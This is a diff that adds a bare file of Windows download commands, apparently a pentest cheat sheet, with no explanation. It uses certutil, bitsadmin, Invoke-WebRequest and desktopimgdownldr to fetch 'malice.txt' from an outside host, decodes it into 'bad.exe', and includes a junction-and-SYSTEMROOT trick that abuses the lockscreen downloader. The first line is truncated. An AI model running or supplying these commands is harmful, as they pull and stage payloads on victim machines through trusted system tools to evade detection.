@@ -1,0 +1,32 @@
+certutil -urlcache -split -f "http://pentestinglabs.com/repo.tx
+
+certutil -urlcache -split -f "http://pentestinglabs.com/malice.txt" malice.txt
+
+
+certutil -decode malice.txt bad.exe
+
+
+
+bitsadmin /transfer myJob /download /priority normal https://pentestinglabs.com/malice.txt c:\Windows\Temp\malice.txt
+
+
+
+Invoke-WebRequest -Uri "https://pentestinglabs.com/malice.txt" -OutFile "C:\Users\Admin\malice.txt"
+
+
+
+
+
+desktopimgdownldr /lockscreenurl:https://domain.com:8080/file.ext /eventName:randomname
+
+
+
+
+mklink /J "%TEMP%Registration" C:windowsRegistration && set "SYSTEMROOT=%TEMP%" && cmd /c desktopimgdownldr.exe /lockscreenurl:https://pentestinglabs.com/malice.txt /eventName:desktopimgdownldr & rmdir /s /q "%TEMP%Registration"
+
+
+
+C:\Users\Admin\AppData\Local\Temp\Personalization\LockScreenImage
+
+
+
